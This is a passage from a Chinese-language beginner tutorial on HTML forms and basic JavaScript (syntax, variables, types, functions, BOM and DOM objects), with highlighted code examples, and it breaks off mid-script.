<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    form表单属性: </span></span><br><span class="line"><span class="comment">        action: 表单提交的url, 往何处提交数据 . 如果不指定, 默认提交到当前页面</span></span><br><span class="line"><span class="comment">        method: 表单的提交方式 .</span></span><br><span class="line"><span class="comment">            get: 在url后面拼接表单数据, 比如: ?username=Tom&amp;age=12 , url长度有限制 . 默认值</span></span><br><span class="line"><span class="comment">            post: 在消息体(请求体)中传递的, 参数大小无限制的.</span></span><br><span class="line"><span class="comment">    --&gt;</span>   </span><br><span class="line">	</span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get/post&quot;</span>&gt;</span>   #表单提交方式的修改</span><br><span class="line">        用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">        年龄: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>表单中的所有表单项，要想能够正常的采集数据，在提交的时候能提交到服务端，表单项必须指定name属性。 否则，无法提交该表单项。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-表单的拓展使用"><a href="#7-表单的拓展使用" class="headerlink" title="7).表单的拓展使用"></a>7).表单的拓展使用</h3><p>在一个表单中，可以存在很多的表单项，而虽然表单项的形式各式各样，但是表单项的标签其实就只有三个，分别是：</p>
<ul>
<li><p>&lt;input&gt;: 表单项 , 通过type属性控制输入形式。</p>
<table>
<thead>
<tr>
<th>type取值</th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td>默认值，定义单行的输入字段</td>
</tr>
<tr>
<td>password</td>
<td>定义密码字段</td>
</tr>
<tr>
<td>radio</td>
<td>定义单选按钮</td>
</tr>
<tr>
<td>checkbox</td>
<td>定义复选框</td>
</tr>
<tr>
<td>file</td>
<td>定义文件上传按钮</td>
</tr>
<tr>
<td>date&#x2F;time&#x2F;datetime-local</td>
<td>定义日期&#x2F;时间&#x2F;日期时间</td>
</tr>
<tr>
<td>number</td>
<td>定义数字输入框</td>
</tr>
<tr>
<td>email</td>
<td>定义邮件输入框</td>
</tr>
<tr>
<td>hidden</td>
<td>定义隐藏域</td>
</tr>
<tr>
<td>submit &#x2F; reset &#x2F; button</td>
<td>定义提交按钮 &#x2F; 重置按钮 &#x2F; 可点击按钮</td>
</tr>
</tbody></table>
</li>
<li><p>&lt;select&gt;: 定义下拉列表, &lt;option&gt; 定义列表项</p>
</li>
<li><p>&lt;textarea&gt;: 文本域</p>
</li>
</ul>
<p>示例：</p>
<p>创建一个新的表单项的html文件，具体内容如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-表单项标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- value: 表单项提交的值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">     姓名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span> </span><br><span class="line">     性别: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span> 男</span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span> 女 <span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     爱好: <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;java&quot;</span>&gt;</span> java <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;game&quot;</span>&gt;</span> game <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sing&quot;</span>&gt;</span> sing <span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     图像: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;image&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     生日: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span> <span class="attr">name</span>=<span class="string">&quot;birthday&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     时间: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;time&quot;</span> <span class="attr">name</span>=<span class="string">&quot;time&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     日期时间: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;datetime-local&quot;</span> <span class="attr">name</span>=<span class="string">&quot;datetime&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     邮箱: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     年龄: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     学历: <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;degree&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>----------- 请选择 -----------<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>大专<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>本科<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>硕士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span>博士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">select</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     描述: <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">	 	</span><br><span class="line">     <span class="comment">&lt;!-- 表单常见按钮 --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;重置&quot;</span>&gt;</span> </span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span>   </span><br><span class="line">     <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过浏览器打开上述的表单项html文件，最终展示出的表单信息如下：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/d4e6fd6e75794d9e43ad0c6a3d4c6078--0018--image-20231121184043690.png" alt="image-20231121184043690"></p>
<h3 id="7-CSS善用文档"><a href="#7-CSS善用文档" class="headerlink" title="7).CSS善用文档"></a>7).CSS善用文档</h3><p>进入W3C进行查询。即用即查即可</p>
<h2 id="3、js的基本使用"><a href="#3、js的基本使用" class="headerlink" title="3、js的基本使用"></a>3、js的基本使用</h2><h3 id="1-书写语法"><a href="#1-书写语法" class="headerlink" title="1).书写语法"></a>1).书写语法</h3><ul>
<li><p>区分大小写：与 Java 一样，变量名、函数名以及其他一切东西都是区分大小写的</p>
</li>
<li><p>每行结尾的分号可有可无</p>
</li>
<li><p>大括号表示代码块</p>
</li>
<li><p>注释：</p>
<ul>
<li><p>单行注释：&#x2F;&#x2F; 注释内容</p>
</li>
<li><p>多行注释：&#x2F;* 注释内容 *&#x2F;</p>
</li>
</ul>
</li>
</ul>
<p>我们需要借助js中3钟输出语句，来演示书写语法</p>
<table>
<thead>
<tr>
<th>api</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>window.alert()</td>
<td>警告框</td>
</tr>
<tr>
<td>document.write()</td>
<td>在HTML 输出内容</td>
</tr>
<tr>
<td>console.log()</td>
<td>写入浏览器控制台</td>
</tr>
</tbody></table>
<h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2).变量"></a>2).变量</h3><p>书写语法会了，变量是一门编程语言比不可少的，所以接下来我们需要学习js中变量的声明，在js中，变量的声明和java中还是不同的。首先js中主要通过如下3个关键字来声明变量的：</p>
<table>
<thead>
<tr>
<th>关键字</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>var</td>
<td>早期ECMAScript5中用于变量声明的关键字</td>
</tr>
<tr>
<td>let</td>
<td>ECMAScript6中新增的用于变量声明的关键字，相比较var，let只在代码块内生效</td>
</tr>
<tr>
<td>const</td>
<td>声明常量的，常量一旦声明，不能修改</td>
</tr>
</tbody></table>
<p>在js中声明变量还需要注意如下几点：</p>
<ul>
<li>JavaScript 是一门弱类型语言，变量可以存放不同类型的值 。</li>
<li>变量名需要遵循如下规则：<ul>
<li>组成字符可以是任何字母、数字、下划线（_）或美元符号（$）</li>
<li>数字不能开头</li>
<li>建议使用驼峰命名</li>
</ul>
</li>
</ul>
<h3 id="3-数据类型与运算符"><a href="#3-数据类型与运算符" class="headerlink" title="3).数据类型与运算符"></a>3).数据类型与运算符</h3><p>这两个就不用多说了，直接放表格</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>number</td>
<td>数字（整数、小数、NaN(Not a Number)）</td>
</tr>
<tr>
<td>string</td>
<td>字符串，单双引皆可</td>
</tr>
<tr>
<td>boolean</td>
<td>布尔。true，false</td>
</tr>
<tr>
<td>null</td>
<td>对象为空</td>
</tr>
<tr>
<td>undefined</td>
<td>当声明的变量未初始化时，该变量的默认值是 undefined</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>运算规则</th>
<th>运算符</th>
</tr>
</thead>
<tbody><tr>
<td>算术运算符</td>
<td>+ , - , * , &#x2F; , % , ++ , –</td>
</tr>
<tr>
<td>赋值运算符</td>
<td>&#x3D; , +&#x3D; , -&#x3D; , *&#x3D; , &#x2F;&#x3D; , %&#x3D;</td>
</tr>
<tr>
<td>比较运算符</td>
<td>&gt; , &lt; , &gt;&#x3D; , &lt;&#x3D; , !&#x3D; , &#x3D;&#x3D; , &#x3D;&#x3D;&#x3D;   注意     &#x3D;&#x3D; 会进行类型转换，&#x3D;&#x3D;&#x3D; 不会进行类型转换</td>
</tr>
<tr>
<td>逻辑运算符</td>
<td>&amp;&amp; , || , !</td>
</tr>
<tr>
<td>三元运算符</td>
<td>条件表达式 ? true_value: false_value</td>
</tr>
</tbody></table>
<h3 id="4-函数"><a href="#4-函数" class="headerlink" title="4).函数"></a>4).函数</h3><h4 id="①第一种定义方法"><a href="#①第一种定义方法" class="headerlink" title="①第一种定义方法"></a>①第一种定义方法</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> 函数名(参数<span class="number">1</span>,参数<span class="number">2.</span>.)&#123;</span><br><span class="line">    要执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为JavaScript是弱数据类型的语言，所以有如下几点需要注意：</p>
<ul>
<li>形式参数不需要声明类型，并且JavaScript中不管什么类型都是let或者var去声明，加上也没有意义。</li>
<li>返回值也不需要声明类型，直接return即可</li>
</ul>
<h4 id="②第二种定义方法"><a href="#②第二种定义方法" class="headerlink" title="②第二种定义方法"></a>②第二种定义方法</h4><p>第二种可以通过var去定义函数的名字，具体格式如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> functionName = <span class="keyword">function</span> (<span class="params">参数<span class="number">1</span>,参数<span class="number">2.</span>.</span>)&#123;   </span><br><span class="line">	<span class="comment">//要执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他的和第一种方法是相同的</p>
<h3 id="5-BOM对象"><a href="#5-BOM对象" class="headerlink" title="5).BOM对象"></a>5).BOM对象</h3><p>BOM中提供了如下5个对象：</p>
<table>
<thead>
<tr>
<th align="left">对象名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Window</td>
<td align="left">浏览器窗口对象</td>
</tr>
<tr>
<td align="left">Navigator</td>
<td align="left">浏览器对象</td>
</tr>
<tr>
<td align="left">Screen</td>
<td align="left">屏幕对象</td>
</tr>
<tr>
<td align="left">History</td>
<td align="left">历史记录对象</td>
</tr>
<tr>
<td align="left">Location</td>
<td align="left">d地址栏对象</td>
</tr>
</tbody></table>
<p>上述5个对象与浏览器各组成对应的关系如下图所示：</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/4188d3cbe1ed885e474d4ffbe61b3ddd--9adc--image-20231121185953491.png" alt="image-20231121185953491"></p>
<p>主要使用到的是Windows和Location这两个</p>
<h4 id="①Windows对象"><a href="#①Windows对象" class="headerlink" title="①Windows对象"></a>①Windows对象</h4><p>window对象指的是浏览器窗口对象，是JavaScript的全部对象，所以对于window对象，我们可以直接使用，并且对于window对象的方法和属性，我们可以省略window.例如：我们之前学习的alert()函数其实是属于window对象的,其完整的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.alert(&#x27;hello&#x27;);</span><br></pre></td></tr></table></figure>

<p>其可以省略window.  所以可以简写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(&#x27;hello&#x27;)</span><br></pre></td></tr></table></figure>

<p>所以对于window对象的属性和方法，我们都是采用简写的方式。window提供了很多属性和方法，下表列出了常用属性和方法</p>
<p>window对象提供了获取其他BOM对象的属性：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>history</td>
<td>用于获取history对象</td>
</tr>
<tr>
<td>location</td>
<td>用于获取location对象</td>
</tr>
<tr>
<td>Navigator</td>
<td>用于获取Navigator对象</td>
</tr>
<tr>
<td>Screen</td>
<td>用于获取Screen对象</td>
</tr>
</tbody></table>
<p>也就是说我们要使用location对象，只需要通过代码<code>window.location</code>或者简写<code>location</code>即可使用</p>
<p>window也提供了一些常用的函数，如下表格所示：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>alert()</td>
<td>显示带有一段消息和一个确认按钮的警告框。</td>
</tr>
<tr>
<td>comfirm()</td>
<td>显示带有一段消息以及确认按钮和取消按钮的对话框。</td>
</tr>
<tr>
<td>setInterval()</td>
<td>按照指定的周期（以毫秒计）来调用函数或计算表达式。</td>
</tr>
<tr>
<td>setTimeout()</td>
<td>在指定的毫秒数后调用函数或计算表达式。</td>
</tr>
</tbody></table>
<h4 id="②Location对象"><a href="#②Location对象" class="headerlink" title="②Location对象"></a>②Location对象</h4><p>location是指代浏览器的地址栏对象，对于这个对象，我们常用的是href属性，用于获取或者设置浏览器的地址信息，添加如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取浏览器地址栏信息</span></span><br><span class="line"><span class="title function_">alert</span>(location.<span class="property">href</span>);</span><br><span class="line"><span class="comment">//设置浏览器地址栏信息</span></span><br><span class="line">location.<span class="property">href</span> = <span class="string">&quot;https://www.itcast.cn&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>浏览器效果如下：首先弹框展示浏览器地址栏信息，</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/2fb1b4a2882b8e052bbc146ab2538a5b--a4c9--image-20231121191247946.png" alt="image-20231121191247946"></p>
<p>然后点击确定后，因为我们设置了地址栏信息，所以浏览器跳转到传智首页</p>
<h3 id="6-DOM对象"><a href="#6-DOM对象" class="headerlink" title="6).DOM对象"></a>6).DOM对象</h3><p>HTML中的Element对象可以通过Document对象获取，而Document对象是通过window对象获取的。document对象提供的用于获取Element元素对象的api如下表所示：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>document.getElementById()</td>
<td>根据id属性值获取，返回单个Element对象</td>
</tr>
<tr>
<td>document.getElementsByTagName()</td>
<td>根据标签名称获取，返回Element对象数组</td>
</tr>
<tr>
<td>document.getElementsByName()</td>
<td>根据name属性值获取，返回Element对象数组</td>
</tr>
<tr>
<td>document.getElementsByClassName()</td>
<td>根据class属性值获取，返回Element对象数组</td>
</tr>
</tbody></table>
<p>操作属性</p>
<p>那么获取到标签了，我们如何操作标签的属性呢？通过查询文档资料，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f44d21e5a1292672353de1d459108e31--a783--image-20231121192858063.png" alt="image-20231121192858063"></p>
<p>得出我们可以通过div标签对象的innerHTML属性来修改标签的内容。此时我们想把页面中的<strong>传智教育替换成传智教育666</strong>，所以要获取2个div中的第一个，所以可以通过下标0获取数组中的第一个div，注释之前的代码，编写如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> divs = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> div1 = divs[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">div1.<span class="property">innerHTML</span> = <span class="string">&quot;传智教育666&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>浏览器刷新页面，展示效果如下图所示：</p>
<p>浏览器刷新页面，展示效果如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/5db9ab60bdd4f569c18c988a032a4621--5c20--image-20231121192928778.png" alt="image-20231121192928778"></p>
<p> 发现页面内容变成了传智教育666</p>
<p>全部源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS-对象-DOM<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;h1&quot;</span> <span class="attr">src</span>=<span class="string">&quot;img/off.gif&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cls&quot;</span>&gt;</span>传智教育<span class="tag">&lt;/<span class="name">div</span>&gt;</span>   <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cls&quot;</span>&gt;</span>黑马程序员<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> 电影</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> 旅游</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> 游戏</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1. 获取Element元素</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.1 获取元素-根据ID获取</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var img = document.getElementById(&#x27;h1&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// alert(img);</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.2 获取元素-根据标签获取 - div</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var divs = document.getElementsByTagName(&#x27;div&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; divs.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(divs[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.3 获取元素-根据name属性获取</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var ins = document.getElementsByName(&#x27;hobby&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; ins.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(ins[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.4 